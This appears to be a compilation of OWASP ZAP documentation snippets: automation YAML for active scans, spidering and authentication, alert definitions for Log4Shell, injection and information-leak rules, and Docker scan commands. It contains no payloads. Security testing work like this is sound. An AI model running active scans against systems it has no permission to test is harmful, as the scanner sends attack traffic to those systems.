TITLE: Working with Custom Global/Script Variables in JavaScript
DESCRIPTION: Examples of setting and getting custom variables that can store complex data types like objects and arrays.

LANGUAGE: javascript
CODE:
var ScriptVars = Java.type("org.zaproxy.zap.extension.script.ScriptVars")

ScriptVars.setScriptCustomVar(this.context, "var.name", {x: 1, y: 3})
print(ScriptVars.getScriptCustomVar(this.context, "var.name").y) // Prints 3

ScriptVars.setGlobalCustomVar("var.name", ["A", "B", "C", "D"])
print(ScriptVars.getGlobalCustomVar("var.name")[2]) // Prints C

----------------------------------------

TITLE: Configuring Active Scan Job in YAML
DESCRIPTION: YAML configuration for ZAP's active scanner job. Includes parameters for context, policy, timing controls, anti-CSRF handling, threading, and custom scan rule definitions. This configuration allows fine-tuned control over how the active scanner behaves when testing target applications.

LANGUAGE: yaml
CODE:
  - type: activeScan                   # The active scanner - this actively attacks the target so should only be used with permission
    parameters:
      context:                         # String: Name of the context to attack, default: first context
      user:                            # String: An optional user to use for authentication, must be defined in the env
      policy:                          # String: Name of the scan policy to be used, default: Default Policy
      maxRuleDurationInMins:           # Int: The max time in minutes any individual rule will be allowed to run for, default: 0 unlimited
      maxScanDurationInMins:           # Int: The max time in minutes the active scanner will be allowed to run for, default: 0 unlimited
      addQueryParam:                   # Bool: If set will add an extra query parameter to requests that do not have one, default: false
      defaultPolicy:                   # String: The name of the default scan policy to use, default: Default Policy
      delayInMs:                       # Int: The delay in milliseconds between each request, use to reduce the strain on the target, default 0
      handleAntiCSRFTokens:            # Bool: If set then automatically handle anti CSRF tokens, default: false
      injectPluginIdInHeader:          # Bool: If set then the relevant rule Id will be injected into the X-ZAP-Scan-ID header of each request, default: false
      scanHeadersAllRequests:          # Bool: If set then the headers of requests that do not include any parameters will be scanned, default: false
      threadPerHost:                   # Int: The max number of threads per host, default: 2 * Number of available processor cores
      maxAlertsPerRule:                # Int: Maximum number of alerts to raise per rule, default: 0 unlimited
    policyDefinition:                  # The policy definition - only used if the 'policy' is not set
      defaultStrength:                 # String: The default Attack Strength for all rules, one of Low, Medium, High, Insane (not recommended), default: Medium
      defaultThreshold:                # String: The default Alert Threshold for all rules, one of Off, Low, Medium, High, default: Medium
      rules:                           # A list of one or more active scan rules and associated settings which override the defaults
      - id:                            # Int: The rule id as per https://www.zaproxy.org/docs/alerts/
        name:                          # String: The name of the rule for documentation purposes - this is not required or actually used
        strength:                      # String: The Attack Strength for this rule, one of Low, Medium, High, Insane, default: Medium
        threshold:                     # String: The Alert Threshold for this rule, one of Off, Low, Medium, High, default: Medium

----------------------------------------

TITLE: Scanning for Log4Shell Vulnerability in Java Applications
DESCRIPTION: Implementation of a security scan rule to detect Log4Shell (CVE-2021-45046) vulnerability in Java applications. The scan checks for malicious JNDI Lookup patterns that could lead to information leakage and remote code execution.

LANGUAGE: java
CODE:
// Referenced code available at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/Log4ShellScanRule.java

----------------------------------------

TITLE: Configuring Log4Shell Vulnerability Alerts in YAML
DESCRIPTION: YAML configuration for Log4Shell vulnerability alerts in OWASP ZAP. It defines the alert ID, type, status, and specific alert details for two Log4Shell variants.

LANGUAGE: yaml
CODE:
title: "Log4Shell"
alertid: 40043
alertindex: 4004300
alerttype: "Active"
status: release
type: alertset
alerts:
   40043-1:
      alertid: 40043-1
      name: "Log4Shell (CVE-2021-44228)"
   40043-2:
      alertid: 40043-2
      name: "Log4Shell (CVE-2021-45046)"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/Log4ShellScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/Log4ShellScanRule.java"

----------------------------------------

TITLE: Configuring Active Scanner Settings in ZAP Automation Framework (YAML)
DESCRIPTION: This YAML configuration sets up the activeScan-config job in ZAP's Automation Framework. It allows for detailed customization of active scan parameters, including scan duration limits, alert thresholds, thread allocation, and various input vector settings for comprehensive security testing.

LANGUAGE: yaml
CODE:
  - type: activeScan-config                # Configures the settings of the active scanner.
    parameters:
      maxRuleDurationInMins:               # Int: The max time in minutes any individual rule will be allowed to run for, default: 0 unlimited
      maxScanDurationInMins:               # Int: The max time in minutes the active scanner will be allowed to run for, default: 0 unlimited
      maxAlertsPerRule:                    # Int: Maximum number of alerts to raise per rule, default: 0 unlimited
      defaultPolicy:                       # String: The name of the default scan policy to use, default: Default Policy
      handleAntiCSRFTokens:                # Bool: If set then automatically handle anti CSRF tokens, default: false
      injectPluginIdInHeader:              # Bool: If set then the relevant rule ID will be injected into the X-ZAP-Scan-ID header of each request, default: false
      threadPerHost:                       # Int: The max number of threads per host, default: 2 * Number of available processor cores
    inputVectors:                          # The input vectors used during the active scan.
      urlQueryStringAndDataDrivenNodes:    # Configures the scanning of query parameters and DDNs.
         enabled:                          # Bool: If query parameters and DDNs scanning should be enabled. Default: true
         addParam:                         # Bool: If a query parameter should be added if none present. Default: false
         odata:                            # Bool: If OData query filters should be scanned. Default: true
      postData:                            # Configures the scanning of request bodies.
        enabled:                           # Bool: If enabled. Default: true
        multiPartFormData:                 # Bool: If multipart form data bodies should be scanned. Default: true
        xml:                               # Bool: If XML bodies should be scanned. Default: true
        json:                              # Configures the scanning of JSON bodies.
          enabled:                         # Bool: If JSON scanning should be enabled. Default: true
          scanNullValues:                  # Bool: If null values should be scanned. Default: false
        googleWebToolkit:                  # Bool: If GWT scanning should be enabled. Default: false
        directWebRemoting:                 # Bool: If DWR scanning should be enabled. Default: false
      urlPath:                             # Bool: If URL path segments should be scanned. Default: false
      httpHeaders:                         # Configures the scanning of HTTP headers.
        enabled:                           # Bool: If HTTP header scanning should be enabled. Default: false
        allRequests:                       # Bool: If set then the headers of requests that do not include any parameters will be scanned. Default: false
      cookieData:                          # Configures the scanning of cookies.
        enabled:                           # Bool: If enabled. Default: false
        encodeCookieValues:                # Bool: If cookie values should be encoded. Default: false
      scripts:                             # Bool: If Input Vector scripts should be used. Default: true

----------------------------------------

TITLE: Implementing Spring4Shell Scanner in Java for ZAP
DESCRIPTION: This code snippet implements a scanner for the Spring4Shell vulnerability (CVE-2022-22965) in ZAP. It's part of the active scan rules and checks for remote code execution via data binding in Spring Framework applications.

LANGUAGE: Java
CODE:
// Code available at:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/Spring4ShellScanRule.java

----------------------------------------

TITLE: Configuring Authentication Auto-Detection in ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to set up authentication auto-detection in a ZAP Automation Framework plan. It configures the environment with context details, browser-based authentication, auto-detect verification and session management, and user credentials.

LANGUAGE: yaml
CODE:
---
env:
  contexts:
  - name: "simple-json"
    urls:
    - "http://localhost:9091/auth/simple-json"
    includePaths:
    - "http://localhost:9091/auth/simple-json.*"
    excludePaths: []
    authentication:
      method: "browser"
      parameters:
        loginPageUrl: "http://localhost:9091/auth/simple-json/"
        loginPageWait: 5
        browserId: "firefox-headless"
      verification:
        method: "autodetect"
    sessionManagement:
      method: "autodetect"
      parameters: {}
    users:
    - name: "test"
      credentials:
        username: "test@test.com"
        password: "password123"

----------------------------------------

TITLE: Configuring Active Scan Policy in YAML
DESCRIPTION: YAML configuration for defining an active scan policy in ZAP Automation Framework. Allows setting default strength and threshold values, along with rule-specific overrides. The policy can be referenced by active scan jobs.

LANGUAGE: yaml
CODE:
  - type: activeScan-policy            # Defines a new active scan policy which can be used by later activeScan related jobs
    parameters:
      name:                            # String: Name of the policy, mandatory
    policyDefinition:                  # The policy definition
      defaultStrength:                 # String: The default Attack Strength for all rules, one of Low, Medium, High, Insane (not recommended), default: Medium
      defaultThreshold:                # String: The default Alert Threshold for all rules, one of Off, Low, Medium, High, default: Medium
      rules:                           # A list of one or more active scan rules and associated settings which override the defaults
      - id:                            # Int: The rule id as per https://www.zaproxy.org/docs/alerts/
        name:                          # Comment: The name of the rule for documentation purposes - this is not required or actually used
        strength:                      # String: The Attack Strength for this rule, one of Low, Medium, High, Insane, default: Medium
        threshold:                     # String: The Alert Threshold for this rule, one of Off, Low, Medium, High, default: Medium

----------------------------------------

TITLE: XSS Scanning Implementation in Java
DESCRIPTION: Implementation of Cross Site Scripting scanner in ZAP security testing tool. The code is part of the active scan rules package that detects potential XSS vulnerabilities.

LANGUAGE: java
CODE:
org.zaproxy.zap.extension.ascanrules.CrossSiteScriptingScanRule

----------------------------------------

TITLE: Scanning for Log4Shell Vulnerability in Java Applications
DESCRIPTION: This code snippet implements a scan rule for detecting the Log4Shell vulnerability (CVE-2021-44228) in Java applications using Apache Log4j2. It is part of the ZAP (Zed Attack Proxy) project's active scan rules.

LANGUAGE: Java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/Log4ShellScanRule.java

----------------------------------------

TITLE: Sample ZAP Authentication Report JSON Structure
DESCRIPTION: Example JSON output from ZAP's authentication report showing metadata, summary items, automation framework environment configuration in YAML format, and collected statistics. Demonstrates the complete structure of an authentication report including browser-based authentication setup and session management.

LANGUAGE: json
CODE:
{
	"@programName": "ZAP",
	"@version": "Dev Build",
	"@generated": "Mon, 10 Feb 2025 17:27:23",
	"site":  "http:\/\/localhost:9091"
	,"summaryItems": [
		{
			"description": "Username field identified",
			"passed": true,
			"key": "auth.summary.username"
		},
		{
			"description": "Password field identified",
			"passed": true,
			"key": "auth.summary.password"
		},
		{
			"description": "Session Handling identified",
			"passed": true,
			"key": "auth.summary.session"
		},
		{
			"description": "Verification URL identified",
			"passed": true,
			"key": "auth.summary.verif"
		}
	]
	,"afEnv": "env:\n  contexts:\n  - name: simple-json-bearer-cookie\n    urls:\n    - http:\/\/localhost:9091\/auth\/simple-json-bearer-cookie\n    includePaths:\n    - http:\/\/localhost:9091\/auth\/simple-json-bearer-cookie.*\n    authentication:\n      method: browser\n      parameters:\n        loginPageUrl: http:\/\/localhost:9091\/auth\/simple-json-bearer-cookie\/\n        loginPageWait: 5\n        browserId: firefox-headless\n        steps: []\n      verification:\n        method: poll\n        loggedInRegex: \\Q 200 OK\\E\n        loggedOutRegex: \\Q 403 Forbidden\\E\n        pollFrequency: 0\n        pollUnits: seconds\n        pollUrl: http:\/\/localhost:9091\/auth\/simple-json-bearer-cookie\/user\n        pollPostData: \"\"\n    sessionManagement:\n      method: headers\n      parameters:\n        Authorization: \"Bearer {%json:accesstoken%}\"\n        Cookie: \"token={%json:accesstoken%}\"\n    technology: {}\n    structure: {}\n    users:\n    - name: test\n      credentials:\n        password: password123\n        username: test@test.com\n  parameters: {}"
	,"statistics": [
		{
			"key": "stats.auth.browser.foundfields",
			"scope": "site",
			"value": 1
		},
		{
			"key": "stats.auth.browser.passed",
			"scope": "site",
			"value": 1
		},
		{
			"key": "stats.auth.configure.session.header",
			"scope": "global",
			"value": 1
		},
		{
			"key": "stats.auth.configure.verification",
			"scope": "global",
			"value": 1
		},
		{
			"key": "stats.auth.detect.auth.json",
			"scope": "global",
			"value": 5
		},
		{
			"key": "stats.auth.detect.session.accesstoken",
			"scope": "global",
			"value": 5
		},
		{
			"key": "stats.auth.detect.session.authorization",
			"scope": "global",
			"value": 1
		},
		{
			"key": "stats.auth.detect.session.token",
			"scope": "global",
			"value": 7
		},
		{
			"key": "stats.auth.session.set.header",
			"scope": "global",
			"value": 20
		},
		{
			"key": "stats.auth.sessiontoken.accesstoken",
			"scope": "site",
			"value": 9
		},
		{
			"key": "stats.auth.sessiontoken.token",
			"scope": "site",
			"value": 6
		},
		{
			"key": "stats.auth.sessiontokens.max",
			"scope": "global",
			"value": 2
		},
		{
			"key": "stats.auth.state.loggedin",
			"scope": "site",
			"value": 2
		},
		{
			"key": "stats.auth.success",
			"scope": "site",
			"value": 1
		}
	]
}

----------------------------------------

TITLE: Implementing JWT Active Scan Rule in Java for ZAP
DESCRIPTION: This code snippet represents the main class for the JWT Active Scan Rule in ZAP. It is responsible for detecting vulnerabilities in JWT implementations during security testing. The full implementation details are available in the linked GitHub repository.

LANGUAGE: java
CODE:
https://github.com/SasanLabs/owasp-zap-jwt-addon/blob/master/src/main/java/org/zaproxy/zap/extension/jwt/JWTActiveScanRule.java

----------------------------------------

TITLE: Advanced ZAP Security Scan Configuration in C#
DESCRIPTION: Advanced implementation showing custom configuration options including URL exclusion, scan rule management, user authentication, and custom assertions using SARIF logging.

LANGUAGE: java
CODE:
[Fact]
public Task SecurityScanWithCustomConfigurationShouldPass() =>
    ExecuteTestAfterSetupAsync(
        context => context.RunAndAssertBaselineSecurityScanAsync(
            configuration => configuration
                .ExcludeUrlWithRegex(".*blog.*")
                .DisablePassiveScanRule(
                    10037,
                    "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)")
                .DisableScanRuleForUrlWithRegex(
                    ".*/about",
                    10038,
                    "Content Security Policy (CSP) Header Not Set")
                .SignIn(),
            sarifLog => sarifLog.Runs[0].Results.Count.ShouldBeLessThan(34)));

----------------------------------------

TITLE: Defining MongoDB NoSQL Injection Alert Configuration
DESCRIPTION: YAML configuration for a MongoDB NoSQL injection security alert, specifying alert properties like ID, risk level, solutions, and references. This defines an alpha-status active scan rule.

LANGUAGE: yaml
CODE:
title: "NoSQL Injection - MongoDB"
alertid: 40033
alertindex: 4003300
alerttype: "Active"
alertcount: 1
status: alpha
type: alert
risk: High
solution: "Do not trust client side input and escape all data on the server side. Avoid to use the query input directly into the where and group clauses and upgrade all drivers at the latest available version."
references:
   - https://arxiv.org/pdf/1506.04082.pdf
   - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html
other: ""
cwe: 943
wasc: 19
techtags: 
  - Db.MongoDB
alerttags: 
  - OWASP_2017_A01
  - OWASP_2021_A03
  - WSTG-v42-INPV-05

----------------------------------------

TITLE: Basic Docker ZAP Baseline Scan
DESCRIPTION: Example of running a basic ZAP baseline scan using Docker without file parameters.

LANGUAGE: bash
CODE:
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://www.example.com

----------------------------------------

TITLE: Configuring Report Generation Job in YAML for ZAP Automation Framework
DESCRIPTION: This YAML configuration snippet defines the parameters for the report generation job in ZAP's Automation Framework. It specifies options such as template, theme, output directory, file naming, and content filtering based on risk levels, confidences, sections, and sites.

LANGUAGE: yaml
CODE:
  - type: report                       # Report generation
    parameters:
      template:                        # String: The template id, default: risk-confidence-html
      theme:                           # String: The template theme, default: the first theme defined for the template (if any)
      reportDir:                       # String: The directory into which the report will be written
      reportFile:                      # String: The report file name pattern, default: {{yyyy-MM-dd}}-ZAP-Report-[[site]]
      reportTitle:                     # String: The report title
      reportDescription:               # String: The report description
      displayReport:                   # Boolean: Display the report when generated, default: false
    risks:                             # List: The risks to include in this report, default all
      - high
      - medium
      - low
      - info
    confidences:                       # List: The confidences to include in this report, default all
      - high
      - medium
      - low
      - falsepositive
    sections:                          # List: The template sections to include in this report - see the relevant template, default all
    sites:                             # List: The sites to include in this report, default all

----------------------------------------

TITLE: Defining ZAP Code Injection Alert Configuration in YAML
DESCRIPTION: YAML configuration that defines the structure and metadata for server-side code injection alerts in ZAProxy. Includes alert IDs, names, and implementation references for both PHP and ASP code injection detection.

LANGUAGE: yaml
CODE:
title: "Server Side Code Injection"
alertid: 90019
alertindex: 9001900
alerttype: "Active"
status: release
type: alertset
alerts:
   90019-1:
      alertid: 90019-1
      name: "Server Side Code Injection - PHP Code Injection"
   90019-2:
      alertid: 90019-2
      name: "Server Side Code Injection - ASP Code Injection"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/CodeInjectionScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/CodeInjectionScanRule.java"

----------------------------------------

TITLE: Detecting Sensitive Information in Browser Storage with Java
DESCRIPTION: This rule scans for sensitive information (credit card numbers, email addresses, US Social security numbers) stored in browser localStorage and sessionStorage. It raises alerts for potential compliance violations. Alerts are raised once per URL and storage key combination.

LANGUAGE: Java
CODE:
SensitiveInfoInStorageScanRule.java

----------------------------------------

TITLE: Implementing PII Scanning in Java for ZAP
DESCRIPTION: This code snippet is part of the PiiScanRule class in ZAP, which scans responses for potential PII disclosures. It likely includes methods for detecting various types of PII such as credit card numbers and social security numbers.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/PiiScanRule.java

----------------------------------------

TITLE: Alert Configuration for 403 Bypass Scanner
DESCRIPTION: YAML configuration block defining the properties of the 403 bypass security scanner alert, including risk level, references, and OWASP mappings.

LANGUAGE: yaml
CODE:
title: "Bypassing 403"
alertid: 40038
alertindex: 4003800
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: Medium
solution: ""
references:
   - https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/
   - https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
   - https://www.contextis.com/en/blog/server-technologies-reverse-proxy-bypass
other: ""
alerttags: 
  - OWASP_2017_A05
  - OWASP_2021_A01
  - POLICY_QA_FULL
  - WSTG-v42-ATHN-04

----------------------------------------

TITLE: Defining Environment File Security Alert Configuration in YAML
DESCRIPTION: YAML configuration for ZAP security scanner that defines the .env file information leak vulnerability alert. Includes risk level, solution guidance, references, and associated security standards like OWASP and WASC.

LANGUAGE: yaml
CODE:
title: ".env Information Leak"
alertid: 40034
alertindex: 4003400
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Ensure the .env file is not accessible."
references:
   - https://www.google.com/search?q=db_password+filetype%3Aenv
   - https://mobile.twitter.com/svblxyz/status/1045013939904532482
other: ""
cwe: 215
wasc: 13
alerttags: 
  - OWASP_2017_A06
  - OWASP_2021_A05
  - POLICY_QA_FULL
  - WSTG-v42-CONF-05
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/EnvFileScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrules/EnvFileScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules/#id-40034

----------------------------------------

TITLE: Executing ZAP Automation with Add-on Management
DESCRIPTION: Example command for running ZAP automation with add-on installation, uninstallation, and updates. Shows how to combine multiple add-on management commands with the automation framework.

LANGUAGE: bash
CODE:
./zap.sh -addonupdate\
    -addoninstall example-1 \
    -addoninstall example-2 \
    -addonuninstall example-3 \
    -cmd -autorun zap.yaml <any other ZAP options>

----------------------------------------

TITLE: Configuring URL Presence Test in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to configure a URL Presence test within a job in the ZAP Automation Framework. It includes options for specifying the test name, URL, operator, regular expressions for request/response headers and bodies, and the action to take on test failure.

LANGUAGE: yaml
CODE:
  jobs:
  - type: something
    tests:
      - name: 'test one'                      # Name of the test, optional
        type: url                             # Specifies that the test is of type 'url'
        url: http://www.example.com/path      # String: The URL to be tested.
        operator: 'and'                       # One of 'and', 'or', default is 'or'
        requestHeaderRegex:                   # String: The regular expression to be matched in the request header, optional
        requestBodyRegex:                     # String: The regular expression to be matched in the request body, optional
        responseHeaderRegex:                  # String: The regular expression to be matched in the response header, optional
        responseBodyRegex:                    # String: The regular expression to be matched in the response body, optional
        onFail: 'info'                        # String: One of 'warn', 'error', 'info', mandatory

----------------------------------------

TITLE: Implementing Exponential Entity Expansion Detection in Java for ZAP
DESCRIPTION: This code snippet is part of ZAP's active scan rules for detecting Exponential Entity Expansion vulnerabilities. It is implemented in Java and likely contains logic for identifying and alerting on potential Billion Laughs attacks in XML or YAML parsers.

LANGUAGE: java
CODE:
// Full code not provided in the given text. Reference to implementation file:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/ExponentialEntityExpansionScanRule.java

----------------------------------------

TITLE: Registering BOAST Server in JavaScript for OWASP ZAP
DESCRIPTION: This snippet demonstrates how to register a new BOAST server using JavaScript in OWASP ZAP. It retrieves the OAST extension, gets the BOAST service, and registers a server with a specified URL.

LANGUAGE: javascript
CODE:
var Control = Java.type("org.parosproxy.paros.control.Control")
var extOast = Control.getSingleton().getExtensionLoader().getExtension("ExtensionOast")
var boast = extOast.getBoastService()
var server = boast.register("https://odiss.eu:1337/events")

----------------------------------------

TITLE: ZAP API Scan Configuration File Format
DESCRIPTION: Sample configuration file showing how to configure scan rules with different warning levels (WARN, IGNORE, FAIL) for both active and passive scan rules.

LANGUAGE: plaintext
CODE:
# zap-api-scan rule configuration file
# Change WARN to IGNORE to ignore rule or FAIL to fail if rule matches
# Active scan rules set to IGNORE will not be run which will speed up the scan
# Only the rule identifiers are used - the names are just for info
# You can add your own messages to each rule by appending them after a tab on each line.
0	WARN	(Directory Browsing - Active/release)
10010	WARN	(Cookie No HttpOnly Flag - Passive/release)
10011	WARN	(Cookie Without Secure Flag - Passive/release)
[...additional rules omitted for brevity...]

----------------------------------------

TITLE: Scanning for Sensitive Information in Browser Storage (Java)
DESCRIPTION: This code snippet is part of a ZAP extension that scans for sensitive information stored in browser localStorage. It's implemented in the SensitiveInfoInStorageScanRule class.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/client/src/main/java/org/zaproxy/addon/client/pscan/SensitiveInfoInStorageScanRule.java

----------------------------------------

TITLE: Running ZAP Baseline Scan with Custom Hook for Logging
DESCRIPTION: This command runs a ZAP baseline scan with a custom hook script for logging all requests and responses. It's useful for detailed investigation of non-trivial issues in Docker environments.

LANGUAGE: bash
CODE:
docker run -v $(pwd):/zap/wrk/:rw -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://www.example.com --hook=LogMessagesHook.py

----------------------------------------

TITLE: Running ZAP Full Scan Script with Docker
DESCRIPTION: Command-line usage for the ZAP full scan script, including all available options and parameters. This script performs a comprehensive security scan against a specified target URL.

LANGUAGE: bash
CODE:
Usage: zap-full-scan.py -t <target> [options]
    -t target         target URL including the protocol, eg https://www.example.com
Options:
    -h                print this help message
    -c config_file    config file to use to INFO, IGNORE or FAIL warnings
    -u config_url     URL of config file to use to INFO, IGNORE or FAIL warnings
    -g gen_file       generate default config file(all rules set to WARN)
    -m mins           the number of minutes to spider for (defaults to no limit)
    -r report_html    file to write the full ZAP HTML report
    -w report_md      file to write the full ZAP Wiki(Markdown) report
    -x report_xml     file to write the full ZAP XML report
    -J report_json    file to write the full ZAP JSON document
    -a                include the alpha active and passive scan rules as well
    -d                show debug messages
    -P                specify listen port
    -D                delay in seconds to wait for passive scanning 
    -i                default rules not in the config file to INFO
    -I                do not return failure on warning (post 2.9.0)
    -j                use the Ajax spider in addition to the traditional one
    -l level          minimum level to show: PASS, IGNORE, INFO, WARN or FAIL, use with -s to hide example URLs
    -n context_file   context file which will be loaded prior to scanning the target
    -p progress_file  progress file which specifies issues that are being addressed
    -s                short output format - dont show PASSes or example URLs
    -T                max time in minutes to wait for ZAP to start and the passive scan to run
    -U user           username to use for authenticated scans - must be defined in the given context file (post 2.9.0)
    -z zap_options    ZAP command line options e.g. -z "-config aaa=bbb -config ccc=ddd"
    --hook            path to python file that define your custom hooks

----------------------------------------

TITLE: ZAP Automation Framework YAML for Log4Shell Scanning
DESCRIPTION: YAML configuration file (log4shell.yaml) for ZAP Automation Framework, defining the scanning job for Log4Shell detection.

LANGUAGE: yaml
CODE:
---
env:
  contexts:
  - name: "Default Context"
    urls:
    - "http://localhost:8000/"
  parameters:
    failOnError: true
    failOnWarning: false
    progressToStdout: true
  vars: {}
jobs:
- parameters: {}
  name: "spider"
  type: "spider"
- parameters: {}
  policyDefinition:
    defaultStrength: "medium"
    defaultThreshold: "off"
    rules:
    - id: 40043
      name: "Log4Shell (CVE-2021-44228)"
      threshold: "medium"
      strength: "default"
  name: "activeScan"
  type: "activeScan"
- parameters:
    time: "0:30"
  name: "delay"
  type: "delay"
- type: report
  parameters:
    template: traditional-json
    reportFile: log4shell-report

----------------------------------------

TITLE: Parameter Tampering Detection in Java for ZAP Scanner
DESCRIPTION: Implementation of a scan rule that checks for parameter tampering vulnerabilities by manipulating request parameters and detecting exposed error pages or stack traces. This rule helps identify improper exception handling and input validation issues.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/ParameterTamperScanRule.java

----------------------------------------

TITLE: Defining Information Disclosure Alerts for Browser Storage in YAML
DESCRIPTION: This YAML configuration defines an alert set for detecting information disclosure in browser storage. It includes two specific alerts: one for localStorage and another for sessionStorage. The configuration also provides metadata such as alert IDs, status, and a link to the associated Java implementation.

LANGUAGE: yaml
CODE:
title: "Information Disclosure - Information in Browser Storage"
alertid: 120000
alertindex: 12000000
alerttype: "Client Passive"
status: alpha
type: alertset
alerts:
   120000-1:
      alertid: 120000-1
      name: "Information Disclosure - Information in Browser localStorage"
   120000-2:
      alertid: 120000-2
      name: "Information Disclosure - Information in Browser sessionStorage"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/client/src/main/java/org/zaproxy/addon/client/pscan/InformationInStorageScanRule.java
linktext: "org/zaproxy/addon/client/pscan/InformationInStorageScanRule.java"

----------------------------------------

TITLE: Implementing Server Side Include Scan Rule in Java for ZAP
DESCRIPTION: This code snippet represents the Java implementation of a scan rule for detecting Server Side Include vulnerabilities in web applications using the OWASP ZAP (Zed Attack Proxy) tool. It is located in the ZAP extensions repository.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/ServerSideIncludeScanRule.java

----------------------------------------

TITLE: Defining Environment Configuration in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet outlines the structure for configuring the environment in ZAP's Automation Framework. It includes context definitions, authentication methods, session management, technology specifications, and custom variables.

LANGUAGE: yaml
CODE:
env:
  contexts :
    - name: context 1
      urls:
      includePaths:
      excludePaths:
      authentication:
        method:
        parameters:
          hostname:
          port:
          realm:
          loginPageUrl:
          loginRequestUrl:
          loginRequestBody:
          script:
          scriptEngine:
        verification:
          method:
          loggedInRegex:
          loggedOutRegex:
          pollFrequency:
          pollUnits:
          pollUrl:
          pollPostData:
          pollAdditionalHeaders:
          - header:
            value:
      sessionManagement:
        method:
        parameters:
          script:
          scriptEngine:
      technology:
        exclude:
        include:
      structure:
        structuralParameters:
      users:
      - name:
        credentials:
          username:
          password:
  vars:
    myVarOne: CustomConfigVarOne
    myVarTwo: ${myVarOne}.VarTwo
  parameters:
    failOnError: true
    failOnWarning: false
    continueOnFailure: false
    progressToStdout: true
  proxy:
    hostname:
    port:
    realm:
    username:
    password:

----------------------------------------

TITLE: ViewState Email Scanner Implementation in Java
DESCRIPTION: Implementation of a passive scanner that detects emails serialized in ASP.NET viewstate fields. This scanner helps identify potential information disclosure vulnerabilities (CWE-642) where sensitive email addresses may be exposed through viewstate serialization.

LANGUAGE: java
CODE:
// Referenced at: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java

----------------------------------------

TITLE: Configuring Ajax Spider Job in ZAP Automation Framework (YAML)
DESCRIPTION: Detailed YAML configuration for the spiderAjax job type, including parameters for browser control, crawling depth, authentication, element selection, and testing criteria. Supports modern web application scanning with configurable timeout, scope, and browser settings.

LANGUAGE: yaml
CODE:
  - type: spiderAjax                   # The ajax spider - slower than the spider but handles modern apps well
    parameters:
      context:                         # String: Name of the context to spider, default: first context
      user:                            # String: An optional user to use for authentication, must be defined in the env
      url:                             # String: Url to start spidering from, default: first context URL
      maxDuration:                     # Int: The max time in minutes the ajax spider will be allowed to run for, default: 0 unlimited
      maxCrawlDepth:                   # Int: The max depth that the crawler can reach, default: 10, 0 is unlimited
      numberOfBrowsers:                # Int: The number of browsers the spider will use, more will be faster but will use up more memory, default: number of cores
      runOnlyIfModern:                 # Boolean: If true then the spider will only run if a "modern app" alert is raised, default: false
      inScopeOnly:                     # Boolean: If true then any URLs requested which are out of scope will be ignored, default: true
      browserId:                       # String: Browser Id to use, default: firefox-headless
      clickDefaultElems:               # Bool: When enabled only click the default element: 'a', 'button' and 'input', default: true
      clickElemsOnce:                  # Bool: When enabled only click each element once, default: true
      eventWait:                       # Int: The time in milliseconds to wait after a client side event is fired, default: 1000
      maxCrawlStates:                  # Int: The maximum number of crawl states the crawler should crawl, default: 0 unlimited
      randomInputs:                    # Bool: When enabled random values will be entered into input element, default: true
      reloadWait:                      # Int: The time in milliseconds to wait after the URL is loaded, default: 1000
      elements:                        # A list of HTML elements to click - will be ignored unless clickDefaultElems is false
      - "a"
      - "button"
      - "input"
      excludedElements:                 # A list of HTML elements to exclude from click.
        - description: "Logout Button"  # String: Description of the exclusion.
          element: "button"             # String: Name of the element.
          xpath:                        # String: XPath of the element, optional.
          text:                         # String: Text of the element (exact match and case sensitive), optional.
          attributeName: "aria-label"   # String: Name of the attribute, optional unless the value is provided.
          attributeValue: "Logout"      # String: Value of the attribute, optional unless the name is provided.
      
    tests:
      - name: 'At least 100 URLs found'      # String: Name of the test, default: statistic + operator + value
        type: 'stats'                        # String: Type of test, only 'stats' is supported for now
        statistic: 'spiderAjax.urls.added'   # String: Name of an integer / long statistic, currently supported: 'spiderAjax.urls.added'
        operator: '>='                       # String ['==', '!=', '>=', '>', '<', '<=']: Operator used for testing
        value: 100                           # Int: Change this to the number of URLs you expect to find
